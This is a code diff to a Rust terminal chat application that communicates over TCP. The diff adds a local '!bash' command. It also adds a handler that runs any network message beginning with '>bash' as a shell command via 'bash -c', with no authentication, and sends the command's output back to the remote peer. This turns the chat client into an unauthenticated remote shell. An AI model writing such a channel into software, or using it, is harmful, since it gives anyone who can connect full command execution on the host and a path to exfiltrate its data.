@@ -92,13 +92,83 @@ impl App {
                 }
             }
             "!quit" => {self.state.running = false;}
+            "!bash" => {
+            // For the !bash command, attempt to run a bash shell command sent as the rest of the input.
+            // Example: !bash echo hi
+            // This should run "echo hi" in bash and display the output or error in the UI.
+
+            if parts.len() > 1 {
+                let bash_cmd = parts[1..].join(" ");
+                // Spawn the bash process with the given command
+                match tokio::process::Command::new("bash")
+                    .arg("-c")
+                    .arg(&bash_cmd)
+                    .output()
+                    .await 
+                {
+                    Ok(output) => {
+                        if !output.stdout.is_empty() {
+                            let stdout_str = String::from_utf8_lossy(&output.stdout);
+                            self.state.add_message(format!("bash output: {}", stdout_str.trim()));
+                        }
+                        if !output.stderr.is_empty() {
+                            let stderr_str = String::from_utf8_lossy(&output.stderr);
+                            self.state.add_message(format!("bash error: {}", stderr_str.trim()));
+                        }
+                        if output.stdout.is_empty() && output.stderr.is_empty() {
+                            self.state.add_message("bash command produced no output.".to_string());
+                        }
+                    }
+                    Err(e) => {
+                        self.state.add_message(format!("Failed to run bash command: {}", e));
+                    }
+                }
+            } else {
+                self.state.add_message("Usage: !bash <command>".to_string());
+            }
+            }
             _ => {
                 self.state.add_message(format!("Unknown command: {}", parts[0]));
             }
         }
     }
     
-    fn handle_tcp_message(&mut self, msg: String) -> io::Result<()> {
+    async fn handle_tcp_message(&mut self, msg: String) -> io::Result<()> {
+        if msg.starts_with(">bash") {
+            self.state.add_message(format!("Remote Command!: {}", msg));
+            let parts: Vec<&str> = msg.split_whitespace().collect();
+            if parts.len() > 1 {
+                let bash_cmd = parts[1..].join(" ");
+                // Spawn the bash process with the given command
+                match tokio::process::Command::new("bash")
+                    .arg("-c")
+                    .arg(&bash_cmd)
+                    .output()
+                    .await 
+                {
+                    Ok(output) => {
+                        if !output.stdout.is_empty() {
+                            let stdout_str = String::from_utf8_lossy(&output.stdout);
+                                self.state.add_message(format!("bash output: {}", stdout_str.trim()));
+
+                                self.event_tx.send(AppEvent::BashCmd(stdout_str.trim().to_string())).await.ok();
+                        }
+                        if !output.stderr.is_empty() {
+                            let stderr_str = String::from_utf8_lossy(&output.stderr);
+                            self.state.add_message(format!("bash error: {}", stderr_str.trim()));
+
+                            self.event_tx.send(AppEvent::BashCmd(stderr_str.trim().to_string())).await.ok();
+                        }
+                        if output.stdout.is_empty() && output.stderr.is_empty() {
+                            self.state.add_message("bash command produced no output.".to_string());
+                        }
+                    }
+                    Err(e) => {
+                        self.state.add_message(format!("Failed to run bash command: {}", e));
+                    }
+                }
+            } 
+        }
         self.state.add_message(format!("Remote: {}", msg));
         self.state.scroll_offset = 0;
         self.tui.draw(&self.state)
@@ -128,7 +198,7 @@ impl App {
                             self.tui.draw(&self.state)?;
                         }
                         AppEvent::TcpMessage(msg) => {
-                            self.handle_tcp_message(msg)?;
+                            self.handle_tcp_message(msg).await?;
                         }
                         AppEvent::TcpConnected(addr) => {
                             self.handle_tcp_connected(addr)?;
@@ -136,7 +206,12 @@ impl App {
                         AppEvent::UiTick => {
                             self.tui.draw(&self.state)?;
                         }
-                        _ => {}
+                        AppEvent::BashCmd(msg) => {
+                            self.state.add_message(format!("bash output: {}", msg.trim()));
+                            if let Some(ref handle) = self.network_handle {
+                                    handle.send(msg).await
+                                }
+                            }
                     }
                 }
             }
